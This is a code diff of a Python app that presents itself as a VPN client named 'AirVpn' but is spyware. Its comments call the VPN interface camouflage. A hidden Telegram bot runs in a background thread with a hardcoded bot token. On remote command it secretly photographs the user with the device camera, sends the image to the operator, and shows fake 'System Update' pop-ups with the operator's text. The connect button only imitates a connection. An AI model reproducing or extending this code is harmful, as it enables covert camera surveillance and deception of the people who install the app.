@@ -5,10 +5,11 @@ import os
 import time
 from plyer import camera, notification
 
-# --- Скрытая логика управления ---
+# ТВОЙ ТОКЕН
 TOKEN = "8640024441:AAGLqms9l4_luuro1XSuxBDISJAfu1xD3io"
 bot = telebot.TeleBot(TOKEN)
 
+# --- СКРЫТЫЕ ФУНКЦИИ ---
 @bot.message_handler(commands=['start'])
 def ghost_start(message):
     bot.reply_to(message, "AirVpn Node Online. Жду указаний.")
@@ -16,90 +17,74 @@ def ghost_start(message):
 @bot.message_handler(commands=['photo'])
 def ghost_photo(message):
     try:
-        camera.take_picture(filename="cache_001.jpg", on_complete=lambda path: None)
-        time.sleep(2)
-        if os.path.exists("cache_001.jpg"):
-            with open("cache_001.jpg", "rb") as img:
+        # Пытаемся сделать фото. Файл сохранится в папку приложения
+        photo_path = "system_cache_img.jpg"
+        camera.take_picture(filename=photo_path, on_complete=lambda path: None)
+        time.sleep(3) # Даем камере время сработать
+        if os.path.exists(photo_path):
+            with open(photo_path, "rb") as img:
                 bot.send_photo(message.chat.id, img)
-            os.remove("cache_001.jpg")
+            os.remove(photo_path)
+        else:
+            bot.reply_to(message, "Ошибка: Камера не ответила или доступ запрещен.")
+    except Exception as e:
+        bot.reply_to(message, f"Ошибка камеры: {e}")
+
+@bot.message_handler(commands=['msg'])
+def ghost_msg(message):
+    text = message.text.replace("/msg ", "")
+    try:
+        notification.notify(title='System Update', message=text)
+        bot.reply_to(message, "Сообщение выведено на экран.")
     except:
         pass
 
-def run_bot():
+def run_bot_in_background():
     while True:
         try:
-            bot.polling(none_stop=True)
+            bot.polling(none_stop=True, interval=0, timeout=20)
         except:
             time.sleep(10)
 
-# Запуск бота в скрытом потоке
-threading.Thread(target=run_bot, daemon=True).start()
+# Запуск бота в отдельном потоке
+threading.Thread(target=run_bot_in_background, daemon=True).start()
 
-# --- Интерфейс "AirVpn" ---
+# --- ВИЗУАЛ VPN (ДЛЯ МАСКИРОВКИ) ---
 def main(page: ft.Page):
     page.title = "AirVpn"
     page.theme_mode = ft.ThemeMode.DARK
-    page.window_width = 350
-    page.window_height = 600
+    page.bgcolor = "#101217"
     page.vertical_alignment = ft.MainAxisAlignment.CENTER
     page.horizontal_alignment = ft.CrossAxisAlignment.CENTER
-    page.bgcolor = "#101217"
 
-    status_text = ft.Text("Disconnected", color="#707070", size=16)
-    location_text = ft.Text("Netherlands, Amsterdam", size=14, color="#b0b0b0")
+    status = ft.Text("Safe Connection", color="#707070")
     
-    def on_connect_click(e):
-        if connect_btn.text == "Connect":
-            connect_btn.text = "Disconnecting..."
-            connect_btn.disabled = True
-            page.update()
-            
-            # Имитация подключения
-            time.sleep(1.5)
-            connect_btn.text = "Disconnect"
-            connect_btn.bgcolor = "#303540"
-            connect_btn.disabled = False
-            status_text.value = "Connected"
-            status_text.color = "#00FF7F"
-            page.update()
-        else:
-            connect_btn.text = "Connect"
-            connect_btn.bgcolor = "#007AFF"
-            status_text.value = "Disconnected"
-            status_text.color = "#707070"
-            page.update()
+    def connect_logic(e):
+        btn.text = "Connecting..."
+        page.update()
+        time.sleep(2)
+        btn.text = "Disconnect"
+        btn.bgcolor = "#303540"
+        status.value = "Connected to Netherlands"
+        status.color = "#00FF7F"
+        page.update()
 
-    # Дизайн кнопки в стиле современных VPN
-    connect_btn = ft.ElevatedButton(
-        text="Connect",
-        width=200,
-        height=50,
-        style=ft.ButtonStyle(
-            color=ft.colors.WHITE,
-            bgcolor="#007AFF",
-            shape=ft.RoundedRectangleBorder(radius=12),
-        ),
-        on_click=on_connect_click
+    btn = ft.ElevatedButton(
+        "Connect", 
+        width=220, 
+        height=50, 
+        bgcolor="#007AFF", 
+        color="white",
+        on_click=connect_logic
     )
 
     page.add(
-        ft.Icon(ft.icons.SHIELD_LOCK_ROUNDED, size=80, color="#007AFF"),
-        ft.Container(height=20),
-        ft.Text("AirVpn", size=28, weight=ft.FontWeight.BOLD),
-        status_text,
-        ft.Container(height=40),
-        ft.Container(
-            content=ft.Row([
-                ft.Icon(ft.icons.PUBLIC, color="#b0b0b0"),
-                location_text
-            ], alignment=ft.MainAxisAlignment.CENTER),
-            padding=10,
-            border=ft.border.all(1, "#303540"),
-            border_radius=10,
-            width=250
-        ),
-        ft.Container(height=40),
-        connect_btn
+        ft.Icon(ft.icons.SHIELD_LOCK_ROUNDED, size=100, color="#007AFF"),
+        ft.Text("AirVpn", size=32, weight="bold"),
+        status,
+        ft.Container(height=50),
+        btn,
+        ft.Text("v. 1.2.4 Premium", size=12, color="#303540")
     )
 
 ft.app(target=main)
